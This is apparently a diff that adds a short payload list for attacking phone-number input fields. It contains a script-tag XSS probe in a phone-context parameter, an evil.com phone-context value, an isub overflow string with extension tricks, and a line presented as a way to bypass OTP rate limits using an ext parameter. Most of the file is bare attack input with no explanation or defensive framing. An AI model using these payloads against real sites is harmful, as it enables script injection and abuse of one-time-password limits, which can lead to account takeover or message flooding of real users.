@@ -1,0 +1,10 @@
+7983001181;phone-context=<script>alert()</script>
+7983001181;phone-context=evil.com
+7983001181;isub=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;ext=31;ext+32
+
+
+
+To Bypass OTP Rate Limit using this Method
+
+
+7983001181;ext=1000000000
